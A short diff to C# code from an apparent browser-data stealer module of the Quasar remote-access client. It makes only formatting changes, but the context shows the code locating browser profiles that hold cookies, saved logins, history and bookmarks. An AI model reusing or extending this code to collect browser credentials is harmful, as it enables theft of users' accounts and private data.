@@ -1,10 +1,10 @@
 ﻿using Quasar.Client.Kematian.Browsers.Helpers.Structs;
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
-using System.Collections.Concurrent;    
 
 namespace Quasar.Client.Kematian.Browsers.Helpers
 {
@@ -72,7 +72,8 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
                     // Validate the profile by checking if at least one of the essential files exists
                     if (File.Exists(profile.WebData) || File.Exists(profile.Cookies) || File.Exists(profile.History) || File.Exists(profile.LoginData) || File.Exists(profile.Bookmarks))
                     {
-                        if (basePath.Contains("Application Data")) {
+                        if (basePath.Contains("Application Data"))
+                        {
                             continue;
                         }
                         profiles.Add(profile);
